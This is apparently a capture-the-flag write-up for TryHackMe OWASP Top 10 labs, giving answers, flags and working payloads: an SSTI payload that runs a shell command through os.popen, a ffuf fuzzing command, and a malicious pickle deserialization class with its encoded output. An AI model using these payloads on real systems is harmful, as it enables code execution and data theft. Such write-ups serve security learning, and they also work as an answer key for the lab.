IAAA Failures(1/3)
What is IAAA?
What does IAAA stand for?

Identity, Authentication, Authorisation, Accountability

A01: Broken Access Control
If you don't get access to more roles but can view the data of another users, what type of privilege escalation is this?

Answer: Horizontal

What is the note you found when viewing the user's account who had more than $ 1 million?

Flag: THM{Found.the.Millionare!}

Writeup:

The site is vulnerable to IDOR vulnerability by changing the id from 5 to 7 gives access to other's profile were the flag is hidden.


A07: Authentication Failures
What is the flag on the admin user's dashboard?
Writeup: Here we can create duplicate account using the same username admin in different cases eg. aD<img width="916" height="312" alt="image" src="https://github.com/user-attachments/assets/c744ab77-2cd4-4eb5-a712-36beaae16660" />

Now login with the same username which is Admin account authentication failure.

image
Flag: THM{Account.confusion.FTW!}

A09: Logging & Alerting Failures
It looks like an attacker tried to perform a brute-force attack, what is the IP of the attacker?
Answer: 203.0.113.45

Why?

<img width="427" height="424" alt="image" src="https://github.com/user-attachments/assets/83775d60-302e-4a04-8094-6b7d262a2956" />

We can see the timing between each request is very less which is in miliseconds, So we can confirm that this is an automated bruteforce trial.

Looks like they were able to gain access to an account! What is the username associated with that account?

Answer: admin

What action did the attacker try to do with the account? List the endpoint the accessed.

Answer: /supersecretadminstuff

Application Design Flaws(2/3)
AS02: Security Misconfigurations
Challenge Link(Instance): http://10.49.154.138:<img width="914" height="430" alt="image" src="https://github.com/user-attachments/assets/921287c8-298a-4784-b41a-8462ac7ba551" />

Writeup:

Directory bruteforcing /api endpoints reveals few other directories. In /api/user/admin the flag can be retrieved.

<img width="878" height="421" alt="image" src="https://github.com/user-attachments/assets/f9064c77-e656-45ba-8478-099cc88b9f23" />

Flag: THM{V3RB0S3_3RR0R_L34K}

AS03: Software Supply Chain Failures
Here they have given one python file and the challenge link.

Challenge Link(Instance): http://10.49.154.138:5003

<img width="1578" height="418" alt="image" src="https://github.com/user-attachments/assets/6f6b9238-63b7-4a14-9067-b319a8418c2d" />

We have two endpoints to hit here, one is /api/health and /api/process.

/api/health - Doesn't seem interesting

Let’s hit /api/process. Make sure to include the Content-Type: application/json header, since it’s a RESTful API that works only with JSON. Also, it’s a POST request, so it requires a parameter which is data.

<img width="858" height="438" alt="image" src="https://github.com/user-attachments/assets/9579989f-2685-44e4-9f07-519184482992" />

So we need to find the value for the data parameter, Lets anaylse the python code for any leaks.

<img width="1763" height="774" alt="image" src="https://github.com/user-attachments/assets/60963cb4-d325-4250-a06f-b9a9691cbc2d" />

if data == 'debug': # Value Leaked Here
            return jsonify(debug_info())
So our value is debug, which reveals the flag.

<img width="1496" height="547" alt="image" src="https://github.com/user-attachments/assets/ffd11462-160b-47d3-afc7-32c347d475cb" />

Flag: THM{SUPPLY_CH41N_VULN3R4B1L1TY}

AS04: Cryptographic Failures
Challenge Link: http://10.49.154.138:5004/

Were we can see a Encrypted text in the index page
<img width="1496" height="547" alt="image" src="https://github.com/user-attachments/assets/ff929122-8018-4be9-8d0e-4bdd338d67be" />

Nzd42HZGgUIUlpILZRv0jeIXp1WtCErwR+j/w/lnKbmug31opX0BWy+pwK92rkhjwdf94mgHfLtF26X6B3pe2fhHXzIGnnvVruH7683KwvzZ6+QKybFWaedAEtknYkhe
Anaylsing the source code we can see a js file called decrypt.js which revealed the secret key and algorithm of the encryption

<img width="688" height="443" alt="image" src="https://github.com/user-attachments/assets/3b9a3355-59e8-4cf3-8b9f-2572f82e10b9" />

Algorithm: AES

Cipher Mode: ECB

Padding: No Padding

Key-Size: 128

Key: my-secret-key-16

Now lets decrypt it using decryptors in online like https://www.devglan.com/online-tools/aes-encryption-decryption

Which reveals the flag:

<img width="1514" height="615" alt="image" src="https://github.com/user-attachments/assets/7a6eb6c9-6a56-4698-bf80-04dfb1065da3" />

Flag: THM{CRYPTO_FAILURE_H4RDCOD3D_K3Y}

A05: Injection
Writeup:

Class SSTI Payload:

{{self.__init__.__globals__['__builtins__']['__import__']('os').popen('cat flag.txt').read()}}
image
Flag: THM{SSTI_FLAG_OBTAINED}

AS06: Insecure Design
Challenge Link: http://10.49.154.138:5005

Writeup:

<img width="631" height="826" alt="image" src="https://github.com/user-attachments/assets/dcb2d5e2-df53-4242-88b3-05b63e109ea6" />

Hitting /api/users/admin this endpoint reveals

<img width="1114" height="848" alt="image" src="https://github.com/user-attachments/assets/7bdfb422-9d42-449a-ae1a-2a6fbfc86f47" />

We can see /api/users/admin gives some data lets try fuzzing the endpoint after /api/ with /admin maybe we can get endpoints like /api/profile/admin or /api/data/admin

Fuzzing with ffuf:

Command:

ffuf -u http://10.49.154.138:5005/api/FUZZ/admin -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
<img width="1522" height="832" alt="image" src="https://github.com/user-attachments/assets/b1100bbd-b480-4eba-b1f4-dd76dd101a9a" />

We get /messages endpoints which reveals the flag:

<img width="520" height="197" alt="image" src="https://github.com/user-attachments/assets/fd0f2793-557d-40eb-b963-8ae5b24a2780" />
THM{1NS3CUR3_D35IGN_4SSUMPT10N}

Insecure Data Handling(3/3)
Writeup:

We got an challenge website where 3 letters of the xor key is revealed and we need to find the one letter of the key to decrypt the flag

image
So we can bruteforce which burp and find the key.

Setting up the burp intruder and selecting the last character of the key and select bruteforce mode in the intruder

<img width="1113" height="526" alt="image" src="https://github.com/user-attachments/assets/518cd900-22c3-4831-a5f2-d83b6da9d918" />

Now filter the responses with Length we can see 1 has the highest length lets try KEY1 .

<img width="831" height="322" alt="image" src="https://github.com/user-attachments/assets/a7fd503a-7662-4bd1-897e-de6b2fe429f5" />

Flag: THM{WEAK_CRYPTO_FLAG}

Software or Data Integrity Failures
Writeup:

import pickle
import base64

class Malicious:
    def __reduce__(self):
        # Return a tuple: (callable, args)
        # This will execute: open('flag.txt').read()
        return (eval, ("open('flag.txt').read()",))

# Generate and encode the payload
payload = pickle.dumps(Malicious())
encoded = base64.b64encode(payload).decode()
print(encoded)
O/P:

gASVMwAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwXb3BlbignZmxhZy50eHQnKS5yZWFkKCmUhZRSlC4=
<img width="1495" height="643" alt="image" src="https://github.com/user-attachments/assets/40aa9a4e-d6f0-47e0-bd17-813e140d8a21" />

Flag: THM{INSECURE_DESERIALIZATION}

<img width="1003" height="783" alt="image" src="https://github.com/user-attachments/assets/a0348c63-9afd-4bd3-a0ed-85a1a45d077a" />

